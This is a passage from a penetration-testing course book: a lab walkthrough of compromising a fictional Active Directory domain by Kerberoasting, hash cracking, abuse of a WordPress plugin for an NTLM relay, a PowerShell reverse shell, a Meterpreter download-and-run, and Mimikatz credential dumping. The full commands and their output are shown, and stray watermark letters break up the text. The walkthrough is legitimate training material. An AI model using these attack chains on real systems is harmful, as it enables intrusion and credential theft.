mapped to INTERNALSRV1. Our assumption at this point is that daniela may be able to log in to
the WordPress login page successfully.
Since daniela is kerberoastable, we can attempt to retrieve the user’s password this way. If we
can crack the TGS-REP1206 password hash, we may be able to log in to WordPress and gain
further access to INTERNALSRV1.
If this attack vector fails, we can use WPScan and other web application enumeration tools to
identify potential vulnerabilities on INTERNALSRV1 or switch targets to MAILSRV1.
y
Let’s perform Kerberoasting on Kali with impacket-GetUserSPNs over the SOCKS5 proxy using
Proxychains. To obtain the TGS-REP hash for daniela, we have to provide the credentials of a
domain user. Because we only have one valid set of credentialsk, we’ll use john.
kali@kali:~/beyond$ proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.6.240
s
beyond.com/john
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
o
Password:
ServicePrincipalName Name MemberOf PasswordLastSet LastLogon
Delegation n
------------------------ ------- -------- -------------------------- -------------
------------- ----------
http/internalsrv1.beyond.com dainiela 2022-09-29 04:17:20.062328 2022-10-
05 03:59:48.376728 z
[-] CCache file is not found. Skipping...
D
$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$4c6c4600baa0ef09e40fde6130e3d770$4
9023c03dcf9a21ea5b943e179f843c575d8f54b1cd85ab12658364c23a46fa53b3db5f924a66b1b28143f6
a357abea0cf89af42e08fc38d23b205a3e1b46aed9e181446fa7002def837df76ca5345e3277abaa86...
2e430c5a8f0235b45b66c5fe0c8b4ba16efc91586fc22c2c9c1d8d0434d4901d32665cceac1ab0cdcb89ae
2c2d688307b9c5d361beba29b75827b058de5a5bba8e60af3562f935bd34feebad8e94d44c0aebc032a366
1001541b4e30a20d380cac5047d2dafeb70e1ca3f9e507eb72a4c7
Listing 934 - Kerberoasting the daniela user account
Let’s store the hash in /home/kali/beyond/daniela.hash and launch Hashcat to crack it.
kali@kali:~/beyond$ sudo hashcat -m 13100 daniela.hash
/usr/share/wordlists/rockyou.txt --force
...
$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$b0750f4754ff26fe77d2288ae3cca539$0
922083b88587a2e765298cc7d499b368f7c39c7f6941a4b419d8bb1405e7097891c1af0a885ee76ccd1f32
e988d6c4653e5cf4ab9602004d84a6e1702d2fbd5a3379bd376de696b0e8993aeef5b1e78fb24f5d3c
...
3d3e9d5c0770cc6754c338887f11b5a85563de36196b00d5cddecf494cfc43fcbef3b73ade4c9b09c8ef40
5b801d205bf0b21a3bca7ad3f59b0ac7f6184ecc1d6f066016bb37552ff6dd098f934b2405b99501f22871
1206 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Kerberos_(protocol)
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 852
Made in Morocco
Penetration Testing with Kali Linux
28bff4071409cec4e9545d9fad76e6b18900b308eaac8b575f60bb:DANIelaRO123
...
Listing 935 - Cracking the TGS-REP hash
Very nice! We successfully cracked the TGS-REP hash and obtained the plaintext password for
daniela. Let’s store the username and password in creds.txt.
We already established that no domain user has local Administrator privileges on
any domain computers and we cannot use RDP to log in to them. However, we
may be able to use protocols such as WinRM to access other systems.
Next, let’s try to log in to WordPress at /wp-admin via our forwarded port.
y
k
s
o
n
i
z
D
Figure 304: Successful Login to WordPress as daniela
Great! We successfully logged in to the WordPress instance as daniela. In the next section, we’ll
leverage this access to gain access to another system.
24.5.2 Abuse a WordPress Plugin for a Relay Attack
In the previous section, we retrieved the plaintext password for daniela and gained access to the
WordPress dashboard on INTERNALSRV1. Let’s review some of the settings and plugins.
We’ll begin with the configured users:
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 853
Made in Morocco
Penetration Testing with Kali Linux
Figure 305: Daniela is the only WordPress user y
Figure 305 shows daniela is the only user. Next, let’s check Settings > General.
k
s
o
n
i
z
D
Figure 306: General WordPress settings
The WordPress Address (URL) and Site Address (URL) are DNS names as we assumed. All other
settings in Settings are mostly default values. Let’s review the installed plugins next.
Figure 307: Installed WordPress Plugins
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 854
Made in Morocco
Penetration Testing with Kali Linux
Figure 307 shows three plugins, but only Backup Migration1207 is enabled. Let’s click on Manage,
which brings us to the plugin configuration page. Clicking through the menus and settings, we
discover the Backup directory path.
y
k
Figure 308: Backup Migration plugin settings
s
Figure 308 shows that we can enter a path in this field, which will be used for storing the backup.
We may abuse this functionality to force an authenotication of the underlying system.
Let’s pause here for a moment and plan our next steps. At the moment, there are two promising
attack vectors. n
The first is to upload a malicious WordPress plugin to INTERNALSRV1. By preparing and
i
uploading a web shell or reverse shell, we may be able to obtain code execution on the underlying
z
system.
For the second attack vector, we have to review the BloodHound results again and make some
D
assumptions. As we have discovered, the local Administrator account has an active session on
INTERNALSRV1. Based on this session, we can make the assumption that this user account is
used to run the WordPress instance.
Furthermore, it’s not uncommon that the local Administrator accounts across computers in a
domain are set up with the same password. Let’s assume this is true for the target environment.
We also learned that the domain administrator beccy has an active session on MAILSRV1 and
therefore, the credentials of the user may be cached on the system.
Due to SMB signing being disabled on MAILSRV1 and INTERNALSRV1, a relay attack is possible if
we can force an authentication.
Finally, we identified the Backup directory path field in the WordPress Backup Migration plugin
containing the path for the backup destination. This may allow us to force such an authentication
request.
Based on all of this information, let’s define a plan for the second attack vector. First, we’ll
attempt to force an authentication request by abusing the Backup directory path of the Backup
1207 (WordPress Plugins Backup Migration, 2022), https://wordpress.org/plugins/backup-backup/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 855
Made in Morocco
Penetration Testing with Kali Linux
Migration WordPress plugin on INTERNALSRV1. By setting the destination path to our Kali
machine, we can use impacket-ntlmrelayx1208 to relay the incoming connection to MAILSRV1. If
our assumptions are correct, the authentication request is made in the context of the local
Administrator account on INTERNALSRV1, which has the same password as the local
Administrator account on MAILSRV1.
If this attack is successful, we’ll obtain privileged code execution on MAILSRV1, which we can
then leverage to extract the NTLM hash for beccy and therefore, meet one of the primary goals of
the penetration test.
Since the second attack vector not only results in code execution on a single system, but also
provides a potential vector to achieve one of the goals of the penetration test, we’ll perform the
relay attack first.
Let’s set up impacket-ntlmrelayx before we modify the Backup directory path in the WordPress
y
plugin. We’ll use --no-http-server and -smb2support to disable the HTTP server and enable SMB2
support. We’ll specify the external address for MAILSRV1, 192.168.50.242, as target for the relay
k
attack. By entering the external address, we don’t have to proxy our relay attack via Proxychains.
Finally, we’ll base64-encode a PowerShell reverse shell oneliner1209 that will connect back to our
Kali machine on port 9999 and provide it as a commands to -c.
kali@kali:~/beyond$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t
o
192.168.50.242 -c "powershell -enc JABjAGwAaQ..."
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
n
[*] Protocol Client SMTP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded.i.
[*] Protocol Client RPC loaded..
z
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB lDoaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections
Listing 936 - Setting up impacket-ntlmrelayx
Next, we’ll set up a Netcat listener on port 9999 for the incoming reverse shell.
kali@kali:~/beyond$ nc -nvlp 9999
listening on [any] 9999 ...
Listing 937 - Setting up Netcat listener on port 9999
Now with everything set up, we can modify the Backup directory path.
1208 (Kali, 2022), https://www.kali.org/tools/impacket-scripts/
1209 (Github, 2022), https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 856
Made in Morocco
Penetration Testing with Kali Linux
Let’s set the path to the URI reference1210 //192.168.119.5/test in which the IP is the address of
our Kali machine and test is a nonexistent path.
y
k
Figure 309: Modified Backup directory path
s
Once entered, we can scroll down and click on Save. This should cause the WordPress plugin to
authenticate to impacket-ntlmrelayx in the context of the user running WordPress.
o
...
[*] Authenticating against smb://192.168.50.242 as INTERNALSRV1/ADMINISTRATOR SUCCEED
n
...
[*] Service RemoteRegistry is in stopped state
...
i
[*] Starting service RemoteRegistry
z
...
[*] Executed specified command on host: 192.168.50.242
... D
[*] Stopping service RemoteRegistry
Listing 938 - Executing reverse shell on MAILSRV1 via impacket-ntlmrelayx
Listing 938 confirms the assumptions we made earlier. First, INTERNALSRV1/ADMINISTRATOR
was used to perform the authentication. Second, by successfully authenticating to MAILSRV1, we
confirmed that both machines use the same password for the local Administrator account.
The output also states that the relayed command on MAILSRV1 got executed. Let’s check our
Netcat listener for an incoming reverse shell.
connect to [192.168.119.5] from (UNKNOWN) [192.168.50.242] 50063
whoami
nt authority\system
PS C:\Windows\system32> hostname
MAILSRV1
PS C:\Windows\system32>
Listing 939 - Incoming reverse shell
1210 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#URI_references
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 857
Made in Morocco
Penetration Testing with Kali Linux
Great! We successfully obtained code execution as NT AUTHORITY\SYSTEM by authenticating as
a local Administrator on MAILSRV1 by relaying an authentication attempt from the WordPress
plugin on INTERNALSRV1.
In the next Learning Unit, we’ll leverage the interactive shell on MAILSRV1 to obtain privileged
access to the domain and its domain controller.
24.6 Gaining Access to the Domain Controller
This Learning Unit covers the following Learning Objectives:
• Gather information to prepare client-side attacks
• Leverage client fingerprinting to obtain information
y
In the previous Learning Unit, we gained access to MAILSRV1 as NT AUTHORITY\SYSTEM. Based
on the information from enumerating the network, we’ll attempt to obtain domain Administrator
privileges in this Learning Unit and use them to access the domkain controller.
24.6.1 Cached Credentials
s
As planned, we obtained privileged code execution on MAILSRV1. Our next step is to extract the
password hash for the user daniela, which has an oactive session on this system.
n
Depending on the objective of the penetration test, we should not skip the local
enumeration of the MAILSRV1 system. This could reveal additional vulnerabilities
and sensitive information, wihich we may miss if we directly attempt to extract
the NTLM hash for daniezla.
D
Once we discover that no AV is running, we should upgrade our shell to Meterpreter. This will not
only provide us with a more robust shell environment, but also aid in performing post-exploitation.
Let’s download the previously created Meterpreter reverse shell payload met.exe to perform post-
exploitation.
PS C:\Windows\system32> cd C:\Users\Administrator
PS C:\Users\Administrator> iwr -uri http://192.168.119.5:8000/met.exe -Outfile met.exe
PS C:\Users\Administrator> .\met.exe
Listing 940 - Downloading and executing the Meterpreter reverse shell
In Metasploit, we should receive a new incoming session.
[*] Sending stage (200774 bytes) to 192.168.50.242
[*] Meterpreter session 2 opened (192.168.119.5:443 -> 192.168.50.242:50814)
Listing 941 - Incoming Meterpreter session in Metasploit
Let’s interact with the session and spawn a new PowerShell command line shell.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 858
Made in Morocco
Penetration Testing with Kali Linux
msf6 post(multi/manage/autoroute) > sessions -i 2
[*] Starting interaction with 2...
meterpreter > shell
Process 416 created.
Channel 1 created.
Microsoft Windows [Version 10.0.20348.1006]
(c) Microsoft Corporation. All rights reserved.
C:\Users\Administrator> powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Install the latest PowerShell for new features and improvements!
https://aka.ms/PSWindows y
PS C:\Users\Administrator>
k
Listing 942 - Interacting with Session 2 and spawning a PowerShell command shell
Next, we’ll download the current Mimikatz1211 version on Kali and serve it via our Python3 web
s
server on port 8000. On MAILSRV1, we’ll download Mimikatz with iwr and launch it.
PS C:\Users\Administrator> iwr -uri http://19o2.168.119.5:8000/mimikatz.exe -Outfile
mimikatz.exe
PS C:\Users\Administrator> .\mimikatz.enxe
.\mimi.exe
i
.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
.## ^ ##. "A La Vie, A L'Amozur" - (oe.eo)
## / \ ## /*** Benjamin DELPY `gentilkiwi` ( PI:EMAIL )
## \ / ## > https://blog.gentilkiwi.com/mimikatz
D
'## v ##' Vincent LE TOUX ( PI:EMAIL )
'#####' > https://pingcastle.com / https://mysmartlogon.com ***/
Listing 943 - Downloading and launching the newest version of Mimikatz from our Kali machine
Once Mimikatz is launched, we can use privilege::debug to obtain SeDebugPrivilege.1212 Then, we
can use sekurlsa::logonpasswords to list all provider credentials available on the system.
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # sekurlsa::logonpasswords
...
Authentication Id : 0 ; 253683 (00000000:0003def3)
Session : Interactive from 1
User Name : beccy
Domain : BEYOND
Logon Server : DCSRV1
Logon Time : 3/8/2023 4:50:32 AM